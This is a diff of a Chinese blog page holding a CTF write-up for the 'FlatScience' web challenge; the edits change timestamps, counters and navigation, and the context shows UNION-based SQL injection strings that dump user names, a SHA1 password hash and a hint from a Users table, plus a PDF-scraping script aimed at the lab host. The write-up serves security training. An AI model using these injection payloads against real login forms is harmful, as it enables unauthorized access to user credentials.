@@ -71,7 +71,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/12/30/ctf-web-FlatScience/4.PNG">
 <meta property="og:image" content="http://yoursite.com/2019/12/30/ctf-web-FlatScience/5.PNG">
 <meta property="article:published_time" content="2019-12-30T08:22:55.000Z">
-<meta property="article:modified_time" content="2019-12-30T13:34:20.084Z">
+<meta property="article:modified_time" content="2019-12-30T13:40:33.913Z">
 <meta property="article:author" content="egg">
 <meta property="article:tag" content="SQL注入">
 <meta property="article:tag" content="sha1解密">
@@ -250,7 +250,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2019-12-30 17:22:55 / 修改时间：22:34:20" itemprop="dateCreated datePublished" datetime="2019-12-30T17:22:55+09:00">2019-12-30</time>
+              <time title="创建时间：2019-12-30 17:22:55 / 修改时间：22:40:33" itemprop="dateCreated datePublished" datetime="2019-12-30T17:22:55+09:00">2019-12-30</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -313,7 +313,7 @@
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询用户的SQL：usr=%27 UNION SELECT id, name from Users --+&amp;pw=</span><br><span class="line">查询密码的SQL：usr=%27 UNION SELECT id, password from Users--+&amp;pw=</span><br><span class="line">查询隐藏内容的SQL：usr=%27 UNION SELECT id, hint from Users--+&amp;pw=</span><br></pre></td></tr></table></figure></div>
 <p> 7_1.分别得出：</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id:admin</span><br><span class="line">password:3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">hint:my+fav+word+<span class="keyword">in</span>+my+fav+paper%3F%2</span><br></pre></td></tr></table></figure></div>
-<p>8.其实到这里，因为之前已经知道密码存在sha1加密，我们直接拿着密码去 MD5解密得到解密后的密码就可以直接去网站上登陆获得flag。不知道是不是当初设计上的漏送，导致这题只有1星，实际上从答题人数和麻烦程度来说远不止1星。<br><img src="3.PNG" alt=""><br><br><br>9.闲着无聊，并不想那么轻易的答题，尝试出题人的正常解题方式答题。<br> 9_1.我们在最开始进入网页的时候，可以看到非常多的PDF文件，根据第7步骤的hint隐藏线索的显示，出提人是想让我们从大量的PDF中找出密码。<br> 9_2.虽然是web渗透方向的题目，我们确实也可以一个一个点下载获得PDF，不过作为一个猿，我在网上找了很多爬取PDF的python代码，因为2020年1月开始，py2的代码不再被py3向下兼容，我就把代码改装成py3的代码，并加上了多网页爬取PDF。<br><img src="4.PNG" alt=""></p>
+<p>8.其实到这里，因为之前已经知道密码存在sha1加密，我们直接拿着密码去 MD5解密得到解密后的密码就可以直接去admin.php登陆获得flag。不知道是不是当初设计上的漏送，导致这题只有1星，实际上从答题人数和麻烦程度来说远不止1星。<br><img src="3.PNG" alt=""><br><br><br>9.闲着无聊，并不想那么轻易的答题，尝试出题人的正常解题方式答题。<br> 9_1.我们在最开始进入网页的时候，可以看到非常多的PDF文件，根据第7步骤的hint隐藏线索的显示，出提人是想让我们从大量的PDF中找出密码。<br> 9_2.虽然是web渗透方向的题目，我们确实也可以一个一个点下载获得PDF，不过作为一个猿，我在网上找了很多爬取PDF的python代码，因为2020年1月开始，py2的代码不再被py3向下兼容，我就把代码改装成py3的代码，并加上了多网页爬取PDF。<br><img src="4.PNG" alt=""></p>
 <details>
 <summary>python3爬取多目标网页PDF文件并下载到指定目录     展开/折叠</summary>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># open the url and read</span><br><span class="line">def getHtml(url):</span><br><span class="line">    page &#x3D; urllib.request.urlopen(url)</span><br><span class="line">    html &#x3D; page.read()</span><br><span class="line">    page.close()</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def getUrl(html):</span><br><span class="line">    reg &#x3D; r&#39;(?:href|HREF)&#x3D;&quot;?((?:http:&#x2F;&#x2F;)?.+?\.pdf)&#39;</span><br><span class="line">    url_re &#x3D; re.compile(reg)</span><br><span class="line">    url_lst &#x3D; url_re.findall(html.decode(&#39;utf-8&#39;))</span><br><span class="line">    return(url_lst)</span><br><span class="line"></span><br><span class="line">def getFile(url):</span><br><span class="line">    file_name &#x3D; url.split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">    u &#x3D; urllib.request.urlopen(url)</span><br><span class="line">    f &#x3D; open(file_name, &#39;wb&#39;)</span><br><span class="line"></span><br><span class="line">    block_sz &#x3D; 8192</span><br><span class="line">    while True:</span><br><span class="line">        buffer &#x3D; u.read(block_sz)</span><br><span class="line">        if not buffer:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        f.write(buffer)</span><br><span class="line">    f.close()</span><br><span class="line">    print (&quot;Sucessful to download&quot; + &quot; &quot; + file_name)</span><br><span class="line"></span><br><span class="line">#指定网页</span><br><span class="line">root_url &#x3D; [&#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;1&#x2F;2&#x2F;5&#x2F;&#39;,</span><br><span class="line">            &#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;&#39;]</span><br><span class="line"></span><br><span class="line">raw_url &#x3D; [&#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;1&#x2F;2&#x2F;5&#x2F;index.html&#39;,</span><br><span class="line">            &#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;index.html&#39;</span><br><span class="line">           ]</span><br><span class="line">#指定目录</span><br><span class="line">os.mkdir(&#39;ldf_download&#39;)</span><br><span class="line">os.chdir(os.path.join(os.getcwd(), &#39;ldf_download&#39;))</span><br><span class="line">for i in range(len(root_url)):</span><br><span class="line">    print(&quot;当前网页：&quot;,root_url[i])</span><br><span class="line">    html &#x3D; getHtml(raw_url[i])</span><br><span class="line">    url_lst &#x3D; getUrl(html)</span><br><span class="line"></span><br><span class="line">    for url in url_lst[:]:</span><br><span class="line">        url &#x3D; root_url[i] + url</span><br><span class="line">        getFile(url)</span><br></pre></td></tr></table></figure></div>
@@ -381,7 +381,10 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
     <a href="/2019/12/29/ctf-web-upload/" rel="prev" title="CTF攻防世界-WEB-upload">
       <i class="fa fa-chevron-left"></i> CTF攻防世界-WEB-upload
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2019/12/31/ctf-web-php2/" rel="next" title="CTF��������-WEB-php2">
+      CTF��������-WEB-php2 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -457,7 +460,7 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -469,7 +472,7 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -570,7 +573,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
       repo: 'MR-eggegg.github.io',
       owner: 'MR-eggegg',
       admin: ['MR-eggegg'],
-      id: 'a676607444a8bc8b150c9a3aff884e61',
+      id: 'f47af1d1eda4d807b02bba32be15120b',
         language: '',
       distractionFreeMode: 'true'
     });
